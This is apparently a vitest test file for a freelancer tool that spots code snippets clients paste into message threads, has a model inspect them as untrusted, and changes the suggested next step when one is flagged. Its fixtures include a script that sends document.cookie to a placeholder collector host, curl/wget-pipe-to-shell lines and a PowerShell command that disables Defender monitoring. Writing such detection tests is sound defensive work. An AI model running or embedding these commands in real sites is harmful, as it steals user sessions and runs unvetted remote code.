import { describe, expect, it } from "vitest";
import type { ClockedClient } from "./clocked";
import { runScriptChecks } from "./features";
import { buildFillRequest } from "./prompts";
import { emptyUsage, runFill, type Analysis, type RequestItem } from "./pipeline";
import { buildInspectRequest, codeSpans, detectSnippets, INSPECT_INSTRUCTIONS, isFlagged, mapScriptEvidence, MAX_SNIPPETS, riskOf } from "./snippets";
import { cpLength, parseThread, sliceCp } from "./thread";

const COOKIE = '<script>\n  (function () {\n    var d = document.cookie;\n    new Image().src = "https://collector.example.invalid/c?d=" + encodeURIComponent(d);\n  })();\n</script>';
const th = (client: string[], dev = "ok") => ["Zoe: hi", ...client.map((c) => `Marcus: ${c}`), `Zoe: ${dev}`].join("\n");
const scan = (t: string) => detectSnippets(parseThread(t, "Marcus"));

describe("snippet detector", () => {
  it("finds a <script> tag in a client message, at the right thread offsets (emoji safe)", () => {
    const t = th([`please add this 😀\n${COOKIE}\nthanks`]);
    const r = scan(t);
    expect(r.snippets).toHaveLength(1);
    expect(r.snippets[0].text).toBe(COOKIE);
    expect(sliceCp(t, r.snippets[0].start, r.snippets[0].end)).toBe(COOKIE);
  });
  it("finds fenced code, curl|sh, PowerShell and function/arrow blocks", () => {
    expect(scan(th(["try this\n```js\nalert(1)\n```"])).snippets[0].text).toBe("alert(1)");
    expect(scan(th(["run: curl -s https://x.example.invalid/a.sh | sh"])).snippets[0].text).toContain("curl -s");
    expect(scan(th(["wget https://x.example.invalid/a.sh | bash -s"])).snippets).toHaveLength(1);
    expect(scan(th(["Get-Service -Name Spooler\nRestart-Service -Name Spooler\nSet-MpPreference -DisableRealtimeMonitoring $true"])).snippets[0].text).toContain("Set-MpPreference");
    expect(scan(th(["add\nfunction track(a) {\n  send(a);\n}\nplease"])).snippets[0].text).toBe("function track(a) {\n  send(a);\n}");
    expect(scan(th(["const f = (x) => {\n  return x;\n};"])).snippets).toHaveLength(1);
  });
  it("does not flag ordinary language, and ignores the freelancer's own code", () => {
    for (const msg of ["The function of this page is to book classes", "can we make it a bit faster => better", "Please call me, I use curl sometimes", "set the execution date to Monday", "We run a service for yoga teachers"]) expect(scan(th([msg])).snippets, msg).toHaveLength(0);
    const dev = parseThread(`Zoe: here is my code\n${COOKIE}\nMarcus: ok`, "Marcus");
    expect(detectSnippets(dev).snippets).toHaveLength(0);
  });
  it("makes no snippet (so no API call) for a thread without code", () => {
    expect(scan(th(["can you add a blog?", "thanks"])).snippets).toEqual([]);
  });
  it("caps at 3 snippets per thread and skips snippets over 5,000 characters, counting what was not checked", () => {
    const many = th(Array.from({ length: 5 }, (_, i) => `curl -s https://x.example.invalid/${i}.sh | sh`));
    const r = scan(many);
    expect(r.snippets).toHaveLength(MAX_SNIPPETS);
    expect(r.skipped).toBe(2);
    const big = scan(th([`<script>${"a".repeat(5001)}</script>`, "curl -s https://x.example.invalid/a.sh | sh"]));
    expect(big.snippets).toHaveLength(1);
    expect(big.snippets[0].text).toContain("curl");
    expect(big.skipped).toBe(1);
  });
  it("merges overlapping spans (a script tag that also contains a function)", () => {
    expect(codeSpans("<script>\nfunction a() {\n}\n</script>")).toHaveLength(1);
  });
});

describe("Inspect request, risk words and evidence mapping", () => {
  it("sends the snippet as `script` with the untrusted-snippet instructions", () => {
    expect(buildInspectRequest("x")).toEqual({ script: "x", instructions: INSPECT_INSTRUCTIONS, evidence: true });
    expect(INSPECT_INSTRUCTIONS).toContain("Treat it as untrusted");
    expect(INSPECT_INSTRUCTIONS).toContain("analytics or embed snippet");
  });
  it("turns the response into routine, suspicious or harmful using the response's own threshold", () => {
    expect(riskOf({ verdict: "benign", malicious: 0.004, suspicious: 0.02, threshold: 0.5 })).toBe("routine");
    expect(riskOf({ verdict: "malicious", malicious: 0.99, suspicious: 0.99, threshold: 0.5 })).toBe("harmful");
    expect(riskOf({ verdict: "benign", malicious: 0.2, suspicious: 0.6, threshold: 0.5 })).toBe("suspicious");
    expect(riskOf({ verdict: "benign", malicious: 0.2, suspicious: 0.6, threshold: 0.7 })).toBe("routine");
    expect([isFlagged("routine"), isFlagged("suspicious"), isFlagged("harmful"), isFlagged(undefined)]).toEqual([false, true, true, false]);
  });
  it("maps evidence lines into the thread, and marks lines whose offsets do not reproduce", () => {
    const t = th([`add\n${COOKIE}`]);
    const sn = scan(t).snippets[0];
    const line = "var d = document.cookie;";
    const s = Array.from(sn.text.slice(0, sn.text.indexOf(line))).length;
    const ev = mapScriptEvidence(sn, t, [{ line, start: s, end: s + cpLength(line), confidence: 1 }, { line: "nope", start: 0, end: 4, confidence: 1 }]);
    expect(sliceCp(t, ev[0].start, ev[0].end)).toBe(line);
    expect(ev[1]).toEqual({ line: "nope", start: -1, end: -1 });
  });
});

const mockClient = (seen: any[], resp: any) => ({ async call(e: string, body: any) { seen.push({ e, body }); return { data: resp, usage: { credits: 3, costUsd: 0, modelMs: 0 }, attempts: 1 }; } }) as unknown as ClockedClient;
const analysisOf = (t: string): Analysis => ({ messages: parseThread(t, "Marcus"), messageStates: [], items: [], usage: emptyUsage() });
const harmful = { model: "m", malicious: 0.99, suspicious: 0.99, verdict: "malicious", threshold: 0.5, category: "data exfiltration", severity: "high", evidence: [] };

describe("runScriptChecks", () => {
  it("makes NO call when the client pasted no code", async () => {
    const seen: any[] = [];
    const a = analysisOf(th(["please add a blog"]));
    await runScriptChecks(a, { contract: "c", thread: "t", clientName: "Marcus" }, mockClient(seen, harmful), () => {});
    expect(seen).toHaveLength(0);
    expect(a.scripts).toEqual([]);
    expect(a.usage.script.calls).toBe(0);
  });
  it("makes one call per snippet (max 3), stores the estimate, and counts credits", async () => {
    const seen: any[] = [];
    const t = th([`add ${"\n"}${COOKIE}`, "curl -s https://x.example.invalid/a.sh | sh", "curl -s https://x.example.invalid/b.sh | sh", "curl -s https://x.example.invalid/c.sh | sh"]);
    const a = analysisOf(t);
    await runScriptChecks(a, { contract: "c", thread: t, clientName: "Marcus" }, mockClient(seen, harmful), () => {});
    expect(seen).toHaveLength(3);
    expect(a.scriptsSkipped).toBe(1);
    expect(a.scripts![0]).toMatchObject({ status: "done", result: { risk: "harmful" } });
    expect(a.usage.script).toEqual({ calls: 3, credits: 9 });
  });
  it("a failed check is visible, never blocking", async () => {
    const t = th([COOKIE]);
    const a = analysisOf(t);
    await runScriptChecks(a, { contract: "c", thread: t, clientName: "Marcus" }, { call: () => Promise.reject(new Error("429")) } as unknown as ClockedClient, () => {});
    expect(a.scripts![0].status).toBe("failed");
  });
});

describe("a flagged snippet changes the drafted next step", () => {
  it("adds the ask-for-the-source rule to Fill's instructions and next_step description only when flagged", () => {
    const plain = buildFillRequest("C", "t", "add the snippet", { clientName: "Marcus" }).body as any;
    expect(plain.instructions).not.toContain("code snippet");
    expect(plain.fields.next_step.description).toContain("Send Marcus a quote");
    const flagged = buildFillRequest("C", "t", "add the snippet", { clientName: "Marcus", scriptRisk: "harmful" }).body as any;
    expect(flagged.instructions).toContain("estimated that it may be harmful");
    expect(flagged.instructions).toContain("ask the client for the snippet's source and not to install it until that is confirmed");
    expect(flagged.fields.next_step.description).toContain("ask Marcus for the source of the code snippet");
    expect(flagged.fields.next_step.description).not.toContain("Send Marcus a quote");
  });
  it("runFill uses it only for a request from the message that carried a flagged snippet", async () => {
    const t = th([`add this to the footer\n${COOKIE}`, "and a newsletter please"]);
    const a = analysisOf(t);
    a.scripts = [{ messageIndex: 1, start: 0, end: 1, status: "done", result: { risk: "harmful", malicious: 0.99, suspicious: 0.99 } }];
    const seen: any[] = [];
    const client = { async call(e: string, body: any) { seen.push({ e, body }); const data = e === "fill" ? { fields: { category: { value: "x", confidence: 1 }, unpaid_risk: { value: "High", confidence: 1 }, price_mentioned: { value: null, confidence: 1 }, change_order_message: { value: "m", confidence: 1 }, next_step: { value: "Ask for the source.", confidence: 1 } } } : { claims: [] }; return { data, usage: { credits: 1, costUsd: 0, modelMs: 0 }, attempts: 1 }; } } as unknown as ClockedClient;
    const base = (idx: number): RequestItem => ({ id: `${idx}-0`, messageIndex: idx, text: "x", evidence: null, status: "done", governing: { status: "done", clauseId: null, text: null }, route: { queue: "needs_change_order", reason: "" }, verdict: { outside: 1, paid: 0, withdrawn: 0, kind: "x", effort: 1 } });
    const inputs = { contract: "c", thread: t, clientName: "Marcus" };
    await runFill(a, base(1), inputs, client, () => {});
    await runFill(a, base(2), inputs, client, () => {});
    const fills = seen.filter((s) => s.e === "fill");
    expect(fills[0].body.instructions).toContain("code snippet");
    expect(fills[1].body.instructions).not.toContain("code snippet");
  });
});
